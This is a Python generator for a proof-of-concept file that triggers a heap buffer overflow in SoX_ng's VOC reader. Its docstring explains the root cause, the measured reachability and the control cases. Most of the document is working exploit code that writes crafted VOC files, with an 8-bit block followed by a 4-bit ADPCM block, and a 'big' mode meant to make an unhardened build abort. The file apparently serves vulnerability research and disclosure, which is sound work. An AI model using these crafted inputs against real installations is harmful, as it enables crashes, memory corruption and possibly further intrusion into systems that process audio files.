#!/usr/bin/env python3
"""
Deterministic generator for the SoX_ng VOC heap buffer overflow PoC.

Vulnerability
-------------
    src/voc.c, read_samples_voc()

        344:  size_t per = max(1, 9 / v->size);      <-- computed ONCE, before the loop
        346:  for (; (done + per <= len); done += per) {
        347:      if (v->block_remaining == 0) {
        348:        rc = getblock(ft);              <-- may change v->size mid-loop
        ...
        409:        case 4:                            /* CRLADPCM4, v->size == 4 */
        413:          *buf++ = ... adpcm_decode(u >> 4, &v->adpcm) ...   /* 2 samples */
        415:          *buf++ = ... adpcm_decode(u     , &v->adpcm) ...   /* per byte    */

Root cause
----------
`per` is the number of samples the loop body is expected to produce per
iteration, and `max(1, 9 / v->size)` is the correct value *for the current*
v->size: 1 for 8-bit, 2 for 4-bit CRLADPCM4, 3/4 for 3/2-bit (over-reserved,
harmless).  But it is computed once, before the loop, from the v->size of
whatever block the call starts on, and it is **never recomputed**.  Nothing
prevents v->size from changing in the middle of the loop either: getblock()'s
VOC_DATA_16 branch re-reads bBitsPerSample and writes v->size directly
(voc.c:643) with no cross-block consistency check.

So a file that starts a sox_read() call on a >4-bit block (per == 1) and then
reaches a 4-bit CRLADPCM4 block makes the body write 2 samples per iteration
while the guard `done + per <= len` only reserves 1.  The write pointer gains one
sample per iteration on the guard and eventually stores past the end of the
caller's buffer.  `buf` is the effect output buffer, allocated by
sox_flow_effects() as lsx_realloc_array(effp->obuf, len) -- exactly len samples,
so this is a 4-byte out-of-bounds write at index len.

Measured reachability (see poc_sox_voc_adpcm_oob_write_asan.log):
  * first block 8-bit, then 4-bit CRLADPCM4 -> overflow, for every first-block
    length tested from 8170 to 8190 bytes.  Precise alignment is NOT required.
  * only 4-bit blocks, or only 8-bit blocks -> no overflow at any length tested
    (256 / 4096 / 8192 / 16384 bytes).
  * the 4-bit block must contain enough data to run the write pointer past the
    end, i.e. roughly first_block_bytes + 2 * adpcm_bytes > len - 1.

Negative result worth knowing (it was tried first and does NOT work)
--------------------------------------------------------------------
Making the first block one byte shorter does not avoid the overflow; it only
moves which store crosses the boundary, between voc.c:413 and voc.c:415.  The
`!v->adpcm.setup.sign` initialisation branch (voc.c:359-376), which writes one
extra sample and compensates with `++done`, is therefore *not* required for the
bug: with an 8190-sample first block the overflowing store is at voc.c:413 on an
iteration where that branch is not taken.  build_clean() below is a genuinely
non-overflowing control instead - a file with no 4-bit block at all.

Encoding note: sblen is a 24-bit field read by lsx_read3(), so it must be encoded
in exactly 3 bytes.  Writing a 4-byte little-endian value shifts the whole file
by one byte and yields a file sox rejects with "sample rate is zero".

No randomness is used: regenerating reproduces the exact bytes.
"""

import struct
import sys

# sox_ng allocates the effect output buffer as lsx_realloc_array(obuf, len),
# i.e. 4*len bytes, and sox_globals.bufsiz defaults to 8192 samples.  The PoC is
# tuned for that default; pass a different length to retarget it.
BUF_LEN = 8192


def u24(n):
    """sblen is a 24-bit little-endian field (lsx_read3)."""
    return struct.pack("<I", n)[:3]


def _header():
    b = bytearray()
    # 20-byte header; startread_voc() strncmp()s only the first 19 bytes.
    b += b"Creative Voice File\x1a"          # 0x00..0x13
    b += struct.pack("<H", 26)                # 0x14..0x15  sbseek (data offset)
    b += struct.pack("<H", 0x010a)            # 0x16..0x17  version
    b += struct.pack("<H", 0x1129)            # 0x18..0x19  checksum (not verified)
    return b


def _block8(payload_len, fill=0x80):
    """VOC_DATA, 8-bit unsigned PCM.
    getblock() consumes type(1)+sblen(3)+rate(1)+comp(1) and sets
    block_remaining = sblen - 2, so sblen must be payload_len + 2."""
    b = bytearray()
    b += bytes([1])                           # block type 1 (VOC_DATA)
    b += u24(payload_len + 2)                 # sblen
    b += bytes([0x10])                        # rate code -> 1000000/(256-16) Hz
    b += bytes([0x00])                        # compression 0 -> v->size = 8
    b += bytes([fill]) * payload_len
    return b


def _block4(payload_len, fill=0x11):
    """VOC_DATA_16, 4-bit CRLADPCM4.  getblock() sets block_remaining = sblen-12,
    and rejects the block only if dwSamplesPerSec != v->rate."""
    b = bytearray()
    b += bytes([9])                           # block type 9 (VOC_DATA_16)
    b += u24(12 + payload_len)                # sblen
    b += struct.pack("<I", 16)                # dwSamplesPerSec, must equal v->rate
    b += bytes([4])                           # bBitsPerSample -> v->size = 4
    b += bytes([1])                           # bChannels
    b += struct.pack("<H", 0x0001)            # wFormat = VOC_FMT_CRLADPCM4
    b += b"\x00" * 4                          # reserved
    b += bytes([fill]) * payload_len
    return b


def build(buf_len=BUF_LEN, first8=None, adpcm_len=256, first_fill=0x80,
          adpcm_fill=0x11):
    """The PoC: 8-bit block first (per = 1), then a 4-bit block (2 samples/byte)."""
    if first8 is None:
        first8 = buf_len - 2
    b = _header()
    b += _block8(first8, first_fill)
    b += _block4(adpcm_len, adpcm_fill)
    return bytes(b)


def build_clean(buf_len=BUF_LEN):
    """Control: an otherwise identical file with no 4-bit block, so `per` always
    matches the samples written and nothing goes out of bounds."""
    b = _header()
    b += _block8(buf_len - 2)
    b += bytes([0])                           # VOC_TERM
    return bytes(b)


def build_pure4(adpcm_len=4096):
    """Control: only 4-bit blocks (per = 2 = samples written)."""
    b = _header()
    b += _block4(adpcm_len)
    return bytes(b)


if __name__ == "__main__":
    # usage: gen.py [poc|clean|pure4|big] [buffer_len] [adpcm_len] [out]
    #   out defaults to stdout; adpcm_len is only read by "big".
    mode    = sys.argv[1] if len(sys.argv) > 1 else "poc"
    buf_len = int(sys.argv[2]) if len(sys.argv) > 2 else BUF_LEN
    adpcm_len = int(sys.argv[3]) if len(sys.argv) > 3 else 8192
    out     = sys.argv[4] if len(sys.argv) > 4 else "-"

    if mode == "poc":
        data = build(buf_len)
    elif mode == "clean":
        data = build_clean(buf_len)
    elif mode == "pure4":
        data = build_pure4()
    elif mode == "big":
        # Long 4-bit block.  The write pointer gains one sample per iteration for
        # as long as the 4-bit block lasts, so a long block turns the 4-byte
        # overshoot of the minimal PoC into a large one, and a plain build with
        # no allocator hardening aborts.  Measured threshold: no abort at
        # adpcm_len=3840, abort at 4096; 8192 used here for margin.
        data = build(buf_len, first8=8, adpcm_len=adpcm_len)
    else:
        raise SystemExit("usage: %s [poc|clean|pure4|big] [buffer_len] [adpcm_len] [out]"
                         % sys.argv[0])

    if out == "-":
        sys.stdout.buffer.write(data)
    else:
        open(out, "wb").write(data)
        print("wrote %d bytes to %s" % (len(data), out))
